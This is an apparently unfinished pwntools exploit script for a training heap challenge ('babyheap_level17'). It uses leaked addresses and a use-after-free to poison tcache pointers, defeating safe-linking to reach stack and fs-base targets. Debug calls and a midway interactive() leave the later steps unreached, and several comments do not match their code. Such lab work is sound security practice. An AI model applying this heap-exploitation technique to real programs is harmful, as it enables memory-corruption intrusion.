#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level17.0_patched'
p = process(binary)

s = '''
b malloc
b free
b * main+462
'''



context.log_level = 'debug'

# parsing the address leak 
p.recvuntil("[LEAK] The local stack address of your allocations is at: ")
stack_leak_str = p.recvline().strip().decode()
stack_leak = int(stack_leak_str.rstrip('.'), 16)  # Remove trailing period if present

p.recvuntil("[LEAK] The address of main is at: ")
main_leak_str = p.recvline().strip().decode()
main_leak = int(main_leak_str.rstrip('.'), 16)  # Remove trailing period if present

# Now you can use these leaks
log.success(f"Stack leak: {hex(stack_leak)}")
log.success(f"Main leak: {hex(main_leak)}")



win = main_leak - 0x11b
rip = stack_leak + 0x138
canary = stack_leak + 0x120 
libc_stack = rip + 0xb8




p.sendline("malloc 0 100")
p.sendline("malloc 1 100")

p.sendline(b"scanf")
p.sendline("1") # 0 becomes rip_addr
p.sendline("AA") # 8 bytes before destination


p.sendline("free 0")
p.sendline("free 1")

p.sendline("puts 0")

p.recvuntil(b"Data: ")
leak_data = int.from_bytes(p.recvline().strip(), 'little')
log.success(f"Heap address: 0x{leak_data:x}") # Keep only the lower 5 bytes (0x55e6ea22e)
# Shift and add the chunk offset
chunk_addr = (leak_data << 12) + 0x330
log.success(f"Heap address: 0x{chunk_addr:x}")



mangled_rip = ((chunk_addr >> 12 ) ^ (libc_stack))


# 1 0

# uaf
# overwriting the next* pointer 
p.sendline(b"scanf")
p.sendline("1") # 0 becomes rip_addr
p.sendline(p64(mangled_rip)) # 8 bytes before destination


p.sendline("malloc 1 100")






p.sendline("malloc 0 100")










p.sendline("puts 0")



p.recvuntil(b"Data: ")
libc_leak = int.from_bytes(p.recvline().strip(), 'little')
log.success(f"Libc address: 0x{libc_leak:x}") # Keep only the lower 5 bytes (0x55e6ea22e)

gdb.attach(p, s)
p.interactive()


fsbase = libc_leak - 0x45ba0

fs20 = fsbase + 0x20



p.sendline("malloc 2 100")


p.sendline("malloc 3 100")

p.sendline("free 3")
p.sendline("free 2")



mangled_fs20 = (((chunk_addr + 0x70) >> 12 ) ^ (fs20))

p.sendline(b"scanf")
p.sendline("2") # 0 becomes rip_addr




p.sendline(p64(mangled_fs20))



p.sendline("malloc 3 100")





p.sendline("malloc 2 100")


p.sendline(b"scanf")
p.sendline("2") # 0 becomes rip_addr

gdb.attach(p, s)
p.sendline(b'A' * 16)









#p.sendline("puts 0")

#p.recvuntil(b"Data: ")
#data = p.recvline().strip()







